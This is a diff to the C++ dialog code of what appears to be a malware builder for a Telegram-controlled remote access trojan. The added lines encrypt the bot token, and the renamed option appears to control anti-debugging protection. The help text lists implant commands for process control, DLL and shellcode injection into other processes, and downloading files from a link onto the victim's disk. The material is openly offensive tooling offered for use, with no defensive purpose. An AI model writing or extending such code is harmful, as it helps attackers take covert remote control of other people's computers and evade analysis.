@@ -21,10 +21,11 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
-
+#pragma warning(disable: 4996)
 #include "DlgProc.h"
 #include "Builder.h"
 #include "Requests.h"
+#include "Manager.h"
 
 #include "resource.h"
 
@@ -80,6 +81,10 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 				{
 					Settings s;
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, 127);
+					
+					strcpy(s.key, RandomStr(CryptoPP::AES::DEFAULT_KEYLENGTH).c_str());
+					strcpy(s.botapi, EncryptStr(s.botapi, s.key).c_str());
+
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, 127);
 
 					INT TextLen = GetWindowTextLengthA(GetDlgItem(hWnd, IDC_EDIT3)) + 1;
@@ -117,10 +122,10 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 
 					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK4), BM_GETCHECK, 0, 0);
 					if (State == BST_CHECKED) {
-						s.protect_debuggers = true;
+						s.protector = true;
 					}
 					else {
-						s.protect_debuggers = false;
+						s.protector = false;
 					}
 
 					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK5), BM_GETCHECK, 0, 0);
@@ -157,7 +162,7 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"/user[ID] processes - get process list %0A"
 						"/user[ID] closeproc [processname.exe] - close process %0A"
 						"/user[ID] inject_dll [processname.exe] [C:\\Path\\To\\File.dll] - Inject dll in process %0A"
-						"/user[id] inject_shell [processname.exe] [shellcode] - Inject shellcode in process"
+						"/user[id] inject_shell [processname.exe] [shellcode] - Inject shellcode in process %0A"
 
 						"%0AAuxiliary:%0A"
 						"/user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH] %0A"
